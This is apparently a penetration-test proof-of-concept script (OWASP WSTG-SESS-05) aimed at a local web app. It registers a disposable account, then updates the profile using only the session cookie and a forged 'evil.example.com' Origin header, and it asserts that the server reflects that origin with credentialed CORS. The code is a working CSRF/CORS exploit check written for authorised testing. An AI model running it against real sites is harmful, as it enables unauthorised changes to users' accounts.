"""
WSTG-SESS-05: Cookie-authenticated profile update is CSRFable.

Registers a disposable account, logs in to obtain a session cookie, then updates
the profile using only the cookie plus an attacker-controlled Origin header.

Expected:
- PUT /api/users/{id} with cookie-only auth returns 200
- The updated display_name persists when re-reading /api/auth/me
"""

from __future__ import annotations

import time
import uuid

import requests


BASE = "http://localhost:3000"
PASSWORD = "password123"
EVIL_ORIGIN = "https://evil.example.com"


def main() -> None:
    stamp = f"{int(time.time())}_{uuid.uuid4().hex[:8]}"
    email = f"wstg_sess05_{stamp}@proton.test"
    username = f"wstg_sess05_{uuid.uuid4().hex[:10]}"

    reg = requests.post(
        f"{BASE}/api/auth/register",
        json={
            "email": email,
            "password": PASSWORD,
            "username": username,
            "display_name": "WSTG SESS05",
        },
        timeout=10,
    )
    reg.raise_for_status()
    user = reg.json()["user"]
    print(f"[+] Registered disposable account: {email}")

    sess = requests.Session()
    login = sess.post(
        f"{BASE}/api/auth/login",
        json={"email": email, "password": PASSWORD},
        timeout=10,
    )
    login.raise_for_status()
    print(f"[+] Session cookies: {sess.cookies.get_dict()}")

    payload = dict(user)
    payload["display_name"] = "CSRF_UPDATED"

    update = sess.put(
        f"{BASE}/api/users/{user['id']}",
        headers={"Origin": EVIL_ORIGIN, "Content-Type": "application/json"},
        json=payload,
        timeout=10,
    )
    update.raise_for_status()
    print(f"[+] Update status: {update.status_code}")
    print(f"[+] ACAO: {update.headers.get('Access-Control-Allow-Origin')}")
    print(f"[+] ACAC: {update.headers.get('Access-Control-Allow-Credentials')}")

    verify = sess.get(f"{BASE}/api/auth/me", timeout=10)
    verify.raise_for_status()
    body = verify.json()
    print(f"[+] Updated profile: {body}")

    assert update.status_code == 200, "Expected cookie-only state change to succeed"
    assert update.headers.get("Access-Control-Allow-Origin") == EVIL_ORIGIN, "Expected reflected Origin"
    assert update.headers.get("Access-Control-Allow-Credentials") == "true", "Expected credentialed CORS"
    assert body["user"]["display_name"] == "CSRF_UPDATED", "Expected profile update to persist"

    print("\n[VULNERABLE] Cookie-authenticated profile update is CSRFable")


if __name__ == "__main__":
    main()
